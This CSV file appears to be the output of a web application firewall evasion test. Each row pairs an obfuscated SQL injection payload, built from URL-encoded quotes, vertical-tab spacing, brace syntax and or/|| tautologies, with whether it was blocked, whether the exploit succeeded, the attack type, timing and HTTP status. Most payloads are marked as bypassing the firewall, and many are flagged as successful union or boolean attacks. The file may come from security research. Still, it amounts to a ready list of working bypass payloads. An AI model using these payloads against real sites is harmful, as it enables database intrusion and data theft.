Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@!=1.%0bor+!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0222,71.45,No,200
0%27<@!=1+or%0bnot%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0299,71.45,No,200
0%27||%0b@<@.%0b||%0b!%0btrue=+(,Bypassed,Yes,unionAtk,Unknown,0.0208,71.45,No,200
0'<@!=1.%0bor%0b!%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0184,71.45,No,500
0'<@!=.1%0b||+!%0btrue=+(!~,Bypassed,No,None,Unknown,0.0131,71.45,No,500
0%27<@!=1.+||+not+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0091,71.45,No,403
0'||+!@<@%0bor+{x+(select%0b1)}=1+like,Bypassed,No,None,Unknown,0.0253,71.45,No,500
0'<@!=1.+||+not+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.018,71.45,No,500
0%27<@!=1.+or%0b!+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0201,71.45,No,200
0%27<@!=.1%0b||+{x%0b(select%0b1)}=1%0blike+{x,Bypassed,Yes,unionAtk,Unknown,0.0155,71.45,No,200
0%27<@!=1+or%0b!+true=%0b(not+,Bypassed,Yes,unionAtk,booleanAtk,0.014,71.45,No,200
0'<@!=.1+or+!+{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0119,71.45,No,500
0'||%0b@<@.+||+not+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0222,71.45,No,500
0%27<@=.1+||+not+true=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0154,71.45,No,200
0%27<@!=.1+||+!+true=+(not,Bypassed,Yes,unionAtk,Unknown,0.0217,71.45,No,200
0'<@=.1+or+not%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0191,70.75,No,500
0%27<@!=1.+||+not+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0286,70.75,No,200
0'<@!=1+or+!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0183,70.75,No,403
0%27<@=1.+||%0b!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.014,70.75,No,200
0%27<@=1+or%0b!+true=+(not+,Bypassed,Yes,unionAtk,booleanAtk,0.0118,70.75,No,200
0%27<@=1.%0b||%0b!+true=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0182,70.75,No,200
0%27<@!=1%0bor+{x+(select+1)}=1%0blike%0btrue,Bypassed,Yes,unionAtk,booleanAtk,0.0255,70.75,No,200
0'<@!=1%0b||+!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0204,70.87,No,500
0'<@=1.+||+not+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0213,71.0,No,500
0%27<@=1%0b||%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0192,71.0,No,200
0%27<@!=1.+||+!+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0118,71.0,No,200
0%27<@!=1+or+not+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,71.0,No,200
0%27<@!=.1+or+!+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0326,71.0,No,200
0%27<@=1.%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,71.0,No,200
0'<@!=1%0bor%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0139,71.0,No,500
0'<@!=.1+or%0bnot+{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0228,71.0,No,500
0'<@=1.%0bor%0b!+{x+(select+1)}=1=+,Bypassed,No,None,Unknown,0.0309,71.0,No,500
0%27or%0b1<@.%0b||%0bnot%0b{`if`%0b1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0118,71.0,No,200
0%27<@!=1.%0b||+!+{`if`%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0206,71.0,No,200
0%27<@!=1.+||%0bnot%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0117,71.0,No,200
0'<@=1%0bor%0b1%0blike+{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0178,71.0,No,500
0'<@=1+||+not+{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0137,71.12,No,500
0%27<@=.1%0bor+not+{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0235,71.25,No,200
0%27<@!=.1%0bor%0bnot%0btrue=%0b(not%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0168,71.25,No,200
0%27<@!=.1%0b||+!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0222,71.25,No,200
0'<@=1+||+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0155,71.25,No,500
0'<@=.1+or+!+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.021,71.35,No,500
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=+,Blocked,No,None,Unknown,0.0267,71.45,No,403
0%27<@=1+or+not+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0286,71.45,No,200
0%27<@=.1+||%0b!%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0155,71.45,No,403
0%27<@!=1.%0bor%0b{a%0b1}=1+like+{a%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0131,71.45,No,200
0%27<@!=1.+or+not%0b{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,71.45,No,200
0%27<@!=.1+or+!+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0164,71.45,No,200
0'<@=.1+||%0bnot%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0111,71.45,No,500
0'<@=1.+or+!%7efalse=+(not+,Bypassed,No,None,booleanAtk,0.014,71.45,No,500
0'<@=1.+||%0b!%0b{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0095,71.45,No,403
0'<@!=1+or%0b!+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0159,71.45,No,500
0%27<@=1+||%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0144,71.45,No,200
0'<@!=.1+||%0bnot+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0117,71.45,No,403
0%27<@=.1+or+not+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0069,71.45,No,200
0%27<@=1.%0b||+not%0btrue=+(not+,Bypassed,Yes,unionAtk,Unknown,0.013,71.45,No,200
0%27<@!=1+||+not+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0169,71.45,No,200
0%27<@=1+||%0bnot%0b{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.007,71.45,No,403
0%27<@=1.%0bor+false=+(not+{`if`,Bypassed,Yes,unionAtk,booleanAtk,0.0141,71.45,No,200
0'<@!=.1+||+not%0b{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0196,71.45,No,500
0'<@=.1%0bor%0b!%0b{x%0b(select+1)}=1=,Bypassed,No,None,Unknown,0.0078,71.45,No,500
0%27<@!=1%0bor+not%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0166,71.45,No,200
0%27<@=.1%0b||+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.013,71.45,No,200
0'<@!=1.+or%0bnot+1=+(!,Bypassed,No,None,Unknown,0.0184,71.45,No,500
0%27<@!=1.+or+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0093,71.45,No,200
0%27<@=1+||+not%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0152,70.75,No,200
0'<@=1.%0bor+{x%0b(select+1)}=1%0blike+{x,Bypassed,No,None,Unknown,0.0173,70.75,No,500
0%27<@=1.+||+false=+(not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0157,70.75,No,200
0%27<@=1.%0bor+{x%0b(select+1)}=1+like+{a,Bypassed,Yes,unionAtk,Unknown,0.0085,70.75,No,200
0%27<@=1.%0bor+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0276,70.75,No,200
0%27or%0b1<@.+||%0bnot+{`if`+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0211,70.75,No,200
0%27||+!@<@.+or%0b{`if`+1}=1+like%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0189,70.75,No,200
0'<@=1.+or+!~false=%0b(!+,Bypassed,No,None,booleanAtk,0.0142,71.0,No,500
0'<@!=1+||+not+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0203,71.0,No,500
0'<@=.1+or+!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0116,71.0,No,500
0'<@!=1%0b||%0bnot+true=+(!%7e,Bypassed,No,None,Unknown,0.0263,71.0,No,500
0'<@!=1%0b||%0bnot%0b{x%0b(select+1)}=1=+,Bypassed,No,None,Unknown,0.0177,71.0,No,500
0'<@!=1%0bor%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0144,71.0,No,500
0%27<@!=1+or%0b!%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.015,71.0,No,403
0%27<@!=1.+or%0bnot%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.014,71.0,No,200
0'<@=1.%0bor+!+{x+(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0198,71.0,No,500
0%27<@!=1.+||+!+true=+(!%7e,Bypassed,Yes,unionAtk,Unknown,0.0188,71.0,No,200
0%27<@=1.+||%0bnot~false=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0179,71.0,No,200
0'<@!=1.%0bor+not+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0199,71.0,No,500
0'<@=1.+or%0bnot%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0117,71.0,No,500
0'<@!=1.+||%0b!+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0124,71.0,No,500
0'<@!=.1%0bor+not%0b{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0148,71.0,No,500
0%27<@=.1%0bor+!%0btrue=+(!+,Bypassed,Yes,unionAtk,booleanAtk,0.0351,71.12,No,200
0'<@!=1.%0bor%0b!+{x+(select+1)}=1=,Bypassed,No,None,Unknown,0.0205,71.25,No,500
0'<@!=.1+||+not%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0094,71.25,No,500
0%27<@=.1+||%0bnot%0b1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0184,71.25,No,200
0%27<@!=1+||+!~false=+(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0127,71.25,No,200
0'<@!=.1+or%0b!+{x+(select+1)}=1=,Blocked,No,None,Unknown,0.0172,71.25,No,403
0%27<@!=1.+or%0bfalse=+(not%0b{a,Bypassed,Yes,unionAtk,booleanAtk,0.0202,71.45,No,200
0%27<@=1+||+not%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0138,71.45,No,200
0'<@=1.%0b||+not%7e0=+(not%0b,Bypassed,No,None,Unknown,0.0131,71.45,No,500
0%27<@!=1%0b||+not%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0121,71.45,No,200
0'<@=.1%0bor+!+{`if`%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.036,71.45,No,500
0'<@!=1+||+not%0b{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0195,71.45,No,500
0%27<@=1.%0b||%0b!+{x+(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.011,71.45,No,200
0'<@=.1+or%0bnot%7e0=%0b(!+,Bypassed,No,None,Unknown,0.0157,71.45,No,500
0%27<@!=1%0b||+not+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0133,71.45,No,200
0'or+!@<@.+||%0b!%0b{a+1}=1=,Bypassed,No,None,Unknown,0.0202,71.45,No,500
0'<@!=1.+or%0bnot%0b1=+(!+,Bypassed,No,None,Unknown,0.0103,71.45,No,500
0'<@=1.+or+{x%0b(select+1)}=1%0blike%0b{`if`,Blocked,No,None,Unknown,0.0177,71.45,No,403
0%27<@!=1+||%0b!+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0122,71.45,No,200
0'<@!=1.%0bor%0bfalse=%0b(!+{`if`,Bypassed,No,None,booleanAtk,0.0162,71.45,No,500
0%27<@!=1.+||%0bnot%7e0=+(not~,Bypassed,Yes,unionAtk,Unknown,0.0207,71.45,No,200
0'<@=.1%0b||+!%0b{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0109,71.45,No,500
0%27or%0b@<@.+or+{a%0b1}=1+like%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0159,71.45,No,200
0%27<@!=1+||%0bnot%0b{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0163,71.45,No,200
0'<@=1%0b||%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.012,71.45,No,500
0'<@!=1+or%0b!%0b{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0223,71.45,No,500
0'<@!=1.+||+not%0b{x%0b(select%0b1)}=1%0b,Bypassed,No,None,Unknown,0.0211,71.45,No,500
0%27<@!=.1+||%0b!+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0101,71.45,No,403
0%27<@!=.1+or%0b!%7efalse=+(!,Bypassed,Yes,unionAtk,booleanAtk,0.0182,70.75,No,200
0'||+1<@.+or+not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0084,70.75,No,403
0'<@!=.1%0b||+!%0b{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0109,70.75,No,500
0%27<@=1.+or%0b0=+(not~false),Bypassed,Yes,unionAtk,booleanAtk,0.0089,70.75,No,200
0%27<@=.1+or+!%0b{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0211,70.75,No,200
0'<@=1+or%0b!+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0158,70.75,No,500
0%27<@!=1%0b||+not%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0178,70.75,No,200
0%27<@!=1.+or%0bnot+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0144,70.75,No,403
0'<@=1%0b||+false=%0b(not+{`if`,Bypassed,No,None,Unknown,0.0142,70.87,No,500
0%27<@=.1%0b||+not+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0234,71.0,No,200
0'<@=1.+||%0b!+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0171,71.0,No,500
0'<@=1%0bor+!+1=+(not~,Bypassed,No,None,Unknown,0.0242,71.0,No,500
0'<@=1+or%0b!%0b{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0151,71.0,No,403
0'<@=1.%0b||+not%0b{x+(select%0b1)}=1=,Bypassed,No,None,Unknown,0.0172,71.0,No,500
0'<@=1%0b||+!+true=+(!+,Bypassed,No,None,Unknown,0.0209,71.0,No,500
0%27<@!=1+or+!+{x%0b(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0225,71.0,No,200
0'<@!=.1+or%0b!%0btrue=+(not%0b,Blocked,No,None,booleanAtk,0.0125,71.0,No,403
0%27<@=1.%0bor+not%7efalse=+(!%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0178,71.0,No,200
0'<@=1.%0bor%0b!+true=+(not,Bypassed,No,None,booleanAtk,0.009,71.0,No,500
0'<@!=1%0b||+not+{x+(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0139,71.0,No,500
0'<@=.1%0bor+!+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0147,71.0,No,500
0'<@!=1.+or%0bnot+{a+1}=1=+(,Bypassed,No,None,Unknown,0.0199,71.0,No,500
0'<@=.1+||+not%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0224,71.0,No,500
0%27<@=1.%0b||+not+1=+(!~,Bypassed,Yes,unionAtk,Unknown,0.0115,71.0,No,200
0'<@!=1+or+not%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0149,71.12,No,500
0'<@!=.1%0b||%0bnot+{a%0b1}=1=+(,Bypassed,No,None,Unknown,0.0169,71.25,No,500
0'<@!=1+||+!+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0108,71.25,No,403
0%27<@=.1+||%0b!%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0178,71.25,No,200
0%27<@=.1+or%0b!+{x%0b(select+1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,71.25,No,200
0'<@!=.1+or%0b!%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.0166,71.25,No,500
0%27<@=1+||%0bnot+{x+(select%0b1)}=1=,Blocked,No,None,Unknown,0.0061,71.45,No,403
0%27or%0b@<@.%0bor+not+{`if`+1}=1=,Bypassed,Yes,unionAtk,Unknown,0.0223,71.45,No,200
0%27<@=1.%0bor+not%0b1=+(!,Bypassed,Yes,unionAtk,Unknown,0.0223,71.45,No,200
0%27<@!=.1%0bor%0b!%0b{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.029,71.45,No,200
0%27<@=1.+or+not+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0195,71.45,No,200
0%27<@!=.1+||%0bnot+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.0131,71.45,No,403
0'<@!=1.%0b||+!%0btrue=+(!+,Bypassed,No,None,Unknown,0.0113,71.45,No,500
0%27<@!=1%0b||%0bnot%0b{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0164,71.45,No,200
0%27<@!=.1%0b||%0bnot+true=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0159,71.45,No,200
0%27<@=1.%0bor%0bnot+{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0146,71.45,No,200
0%27<@!=.1+||+{`if`+1}=1%0blike+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0129,71.45,No,200
0%27<@!=1%0bor+not%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0276,71.45,No,200
0'<@!=.1+or%0bnot+{`if`+1}=1=+(,Bypassed,No,None,Unknown,0.0242,71.45,No,500
0'<@=1.+or%0bnot%0b{x%0b(select%0b1)}=1=,Blocked,No,None,Unknown,0.0077,71.45,No,403
0'<@=.1%0bor+1%0blike+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0223,71.45,No,500
0%27<@!=1%0b||+not~false=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0138,71.45,No,200
0%27<@=1%0b||+not+{x%0b(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0106,71.45,No,200
0'<@!=1.+or+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0131,71.45,No,403
0'<@!=1.%0bor%0bnot%0b1=+(not+,Bypassed,No,None,Unknown,0.0226,71.45,No,500
0%27<@=1.%0bor%0b!+{x+(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.45,No,200
0'||+@<@.%0b||+not~0=%0b(,Bypassed,No,None,Unknown,0.0081,70.75,No,500
0'<@!=1+||%0b!%0b{a+1}=1=%0b(,Bypassed,No,None,Unknown,0.0144,70.75,No,500
0%27<@=.1%0b||%0bnot+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.019,70.75,No,200
0%27<@=.1%0b||+!~false=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0125,70.75,No,200
0'<@=1+or+not%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0129,70.75,No,500
0%27<@!=1+||+!+{`if`+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0134,70.75,No,200
0'<@!=.1+or%0b!+true=+(not+,Bypassed,No,None,booleanAtk,0.0185,70.75,No,500
0%27<@!=1.+or+!+{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0126,70.87,No,403
0%27<@=1.+or%0bnot+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0223,71.0,No,200
0'<@!=1.+||%0b!~0=%0b(not+,Bypassed,No,None,Unknown,0.011,71.0,No,500
0'<@!=1+or%0bnot%7efalse=+(not%0b,Blocked,No,None,booleanAtk,0.0112,71.0,No,403
0'<@!=1%0b||%0b!+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0219,71.0,No,500
0%27<@!=1.+or+not+1=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0144,71.0,No,200
0%27<@=.1+or+not%7e0=+(!,Bypassed,Yes,unionAtk,Unknown,0.0169,71.0,No,200
0%27<@=.1+||+!+{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0115,71.0,No,200
0'<@=.1+or%0b!+{x+(select+1)}=1=%0b,Blocked,No,None,Unknown,0.008,71.0,No,403
0'<@!=1+||%0bnot%0b{a+1}=1=+(,Bypassed,No,None,Unknown,0.011,71.0,No,500
0%27<@=.1+or%0b!+true=+(!%7e,Bypassed,Yes,unionAtk,booleanAtk,0.0152,71.0,No,200
0%27<@!=.1+or+!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0061,71.0,No,200
0'<@!=.1+||+!%0b{x%0b(select%0b1)}=1=+,Bypassed,No,None,Unknown,0.0119,71.0,No,500
0'<@=1.+or%0b!+1=+(!%0b,Bypassed,No,None,Unknown,0.0213,71.0,No,500
0%27<@=.1+||+{x%0b(select+1)}=1+like+{x,Bypassed,Yes,unionAtk,Unknown,0.0133,71.0,No,200
0%27<@=1+or%0b!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0105,71.0,No,403
0%27<@!=.1+||%0b!+{x%0b(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.019,71.0,No,200
0'<@=.1%0bor+not%0b{x+(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0157,71.25,No,500
0%27<@=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0209,71.25,No,200
0%27<@=1%0bor%0b1+like%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.016,71.25,No,200
0%27<@=1.+||%0bnot%0btrue=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,71.25,No,200
0%27<@!=.1+||%0bnot%0b{x+(select+1)}=1=+,Blocked,No,None,Unknown,0.0088,71.25,No,403
0%27<@=.1%0b||+{x%0b(select%0b1)}=1%0blike+{x,Bypassed,Yes,unionAtk,Unknown,0.0229,71.45,No,200
0'<@=1.+or+!+{x+(select%0b1)}=1=+,Blocked,No,None,Unknown,0.0131,71.45,No,403
0'<@!=1+or%0bnot+{a%0b1}=1=%0b(,Bypassed,No,None,Unknown,0.0167,71.45,No,500
0%27<@!=1.%0bor+!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0367,71.45,No,200
0%27<@=1.%0bor+not+{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0209,71.45,No,200
0%27<@!=.1+or%0bnot+{x+(select%0b1)}=1=%0b,Blocked,No,None,Unknown,0.0141,71.45,No,403
0%27<@=1%0bor+!%0b{x+(select%0b1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.017,71.45,No,200
0%27<@=.1+or%0bnot+{a%0b1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0175,71.45,No,200
0%27<@=1%0b||+not%0b{a+1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0128,71.45,No,200
0'<@=1%0bor+{x%0b(select%0b1)}=1%0blike%0b{x,Bypassed,No,None,Unknown,0.0139,71.45,No,500
0%27<@=1.%0b||%0b!%0b{x%0b(select+1)}=1=+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.45,No,200
0'<@=1+or%0b{a%0b1}=1+like%0b{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0177,71.45,No,500
0'<@=1.+||+not%0b{x+(select%0b1)}=1=%0b,Bypassed,No,None,Unknown,0.0178,71.45,No,500
0'<@=1+or+!+{x%0b(select+1)}=1=%0b,Bypassed,No,None,Unknown,0.0163,71.45,No,500
0%27<@=1.%0bor%0b!%0b{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0158,71.45,No,200
0%27<@=1+or%0bfalse=%0b(not+{a,Bypassed,Yes,unionAtk,booleanAtk,0.0082,71.45,No,200
0%27<@!=1%0bor%0bnot+{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0209,71.45,No,200
0'||%0b1<@.%0bor+not~0=+(,Bypassed,No,None,Unknown,0.0175,71.45,No,500
0'<@=.1+or+{x+(select+1)}=1+like%0b{x,Blocked,No,None,Unknown,0.0035,71.45,No,403
0%27<@=1%0bor+not+{a+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0169,71.45,No,200
0'<@!=.1+or%0bnot+{`if`%0b1}=1=+(,Bypassed,No,None,Unknown,0.0157,71.45,No,500
0'<@!=.1+||%0b0=+(!%0b{x,Bypassed,No,None,Unknown,0.0122,71.45,No,500
0%27||%0b@<@.%0b||+!%7efalse=+(,Bypassed,Yes,unionAtk,Unknown,0.0149,71.45,No,200
0%27<@=.1%0bor+!+{`if`%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0093,71.45,No,200
0'<@!=1+||+not+{`if`+1}=1=%0b(,Bypassed,No,None,Unknown,0.0116,71.45,No,500
0%27<@!=1%0bor%0bnot%0b1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.45,No,200
0%27<@!=1.%0b||+!+{x+(select+1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0158,71.45,No,200
0%27<@=1.+||%0b!+true=+(!,Bypassed,Yes,unionAtk,Unknown,0.0159,71.45,No,200
0%27<@!=1.+||%0b0=+(!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0115,71.45,No,200
0%27<@!=1.+or+not+true=%0b(0,Bypassed,Yes,unionAtk,booleanAtk,0.0164,71.45,No,200
0%27<@=.1%0b||%0bnot%0b{x%0b(select%0b1)}=1=%0b,Bypassed,Yes,unionAtk,Unknown,0.0195,71.45,No,200
0%27<@=1+or%0b!+{`if`+1}=1=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0207,71.45,No,200
0'<@=1.%0b||%0bfalse=%0b(not%0b{x,Bypassed,No,None,Unknown,0.0204,71.45,No,500
0%27<@!=1+||%0bnot%0b{a%0b1}=1=+(,Bypassed,Yes,unionAtk,Unknown,0.0118,71.45,No,200
0%27<@=1%0bor%0b!%7efalse=%0b(not%0b,Bypassed,Yes,unionAtk,booleanAtk,0.0197,71.45,No,200
0%27<@=.1%0b||%0b!%0b1=+(!,Bypassed,Yes,unionAtk,Unknown,0.0174,71.45,No,200
0%27<@=.1%0bor+!%0b{x+(select%0b1)}=1=,Bypassed,Yes,unionAtk,Unknown,0.0126,71.45,No,200
